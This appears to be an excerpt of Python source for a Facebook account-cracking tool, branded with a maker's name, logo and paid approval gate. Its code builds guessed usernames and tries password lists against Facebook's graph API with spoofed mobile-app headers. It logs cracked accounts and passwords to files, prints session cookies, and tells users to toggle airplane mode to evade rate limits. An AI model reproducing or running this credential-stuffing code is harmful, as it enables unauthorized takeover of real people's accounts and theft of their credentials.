...
####DESIGN####
def oo(t):
	return '\033[1;35m[\033[1;35m'+str(t)+'\033[1;35m]\033[1;35m '
...
logo= f'''
   \033[1;35m OOOOO   SSSSS    AAA   MM    MM   AAA   
   \033[1;35mOO   OO SS       AAAAA  MMM  MMM  AAAAA  
   \033[1;35mOO   OO  SSSSS  AA   AA MM MM MM AA   AA 
   \033[1;35mOO   OO      SS AAAAAAA MM    MM AAAAAAA 
   \033[1;35m OOOO0   SSSSS  AA   AA MM    MM AA   AA 
\033[1;93m=================================
\033[1;35m Owner  : OSAMA BALOCH
\033[1;35m GitHub : OSAMA-XD 
\033[1;35m Version:\033[1;92m 0.0\033[1;35m
\033[1;35m Status : TESTING 
\033[1;35m Notice : Use 100090 For OK Ids 
\033[1;93m=================================
'''
...
def check(session,coki):
    ...
    if len(game)==0:
        ...
        for gm in game:
            print(f"\033[1;35m---\033[1;96m"+gm.replace('huwtn',' hxw-code=osama-33'))
    ...
    if len(game)==0:
        ...
        for gm in game:
            print(f"\033[1;35m---\033[1;93m"+gm.replace('riJan','Uxx-182^)Code=osama-2233]'))
...
def gmail():     
        ...
        for xd in range(int(limit)):
            ...
            if '3' in lchoice:
                ...
                open('.OSAMA','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            else:
                mail = ''.join(random.choice(string.digits) for _ in range(4))
                open('.OSAMA','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            fo = open('.OSAMA', 'r').read().splitlines()
...
def method():
    ...
    print (f"\033[1;93m YOUR IP : {ip}")
    print(f'{oo("✓")}Total Ids : \033[1;92m'+str(len(accounts)))
    print(f"{oo('-')}Wait As You Can :)")
    print(f"{oo('|')}/sdcard/OSAMA-OK.txt")
    print('\033[1;93m='*25)
    print (f"\033[1;93m USE AROPLANE MODE AFTER EVERY 5MINT FOR GOOD RESULTS ")
    print('\033[1;93m='*25)
    print()
    ...
    def start(user):
     try:
        ...
        sys.stdout.write('\r\033[1;35m[\033[1;35mOSAMA-M1\033[1;35m]\033[1;35m {}-{} \033[1;35m[\033[1;35m{}\033[1;35m] \033[1;35mOK : \033[1;92m{} \033[1;35mCP : \033[1;35m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
      ...
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;35mOSAMA-OK\033[1;92m] \033[1;35m'+acc+' \033[1;92m|\033[1;35m '+pword+'  ')
                open('/sdcard/OSAMA-OK.txt','a').write(f'{acc} | {pword}\n')
                if c=='y':
                    try:
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;35m[\033[1;35mOSAMA-CP\033[1;35m] \033[1;35m'+acc+' \033[1;35m|\033[1;35m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/OSAMA-CP.txt','a').write(f'{acc} | {pword}\n')
                break
            else:
                continue
        loop += 1
    ...
    def start2(user):
      ...
      try:
        ...
        try:
            ...
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;35m[\033[1;35mOSAMA-M2\033[1;35m]\033[1;35m {}-{} \033[1;35m[\033[1;35m{}\033[1;35m] \033[1;35mOK : \033[1;92m{} \033[1;35mCP : \033[1;35m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:
            heads = None
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            ...
            if 'session_key' in response.text:
                ...
                if c=='y':
                 ...
                 print('\r\033[1;93m[\033[1;35mCookie\033[1;93m] \033[1;35m'+cookies)                
                 break
...
def approval():
  ...
  try:
    httpCaht = requests.get('https://github.com/OSAMA-X-X/XD/blob/main/approval.txt').text
    if id in httpCaht:
      ...
      print('\33[1;37m----------------------------------------------')
      print ('\33[1;32mIF U DONT WANT TO BUY PLS DONT PRESS ENTER')
      input('\33[1;32mIF U WANT TO BUY THEN PRESS ENTER ')
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+923317394634?text='+tks),approval()
      time.sleep(0.5)
      Uxx_Main()
  except:
    sys.exit()
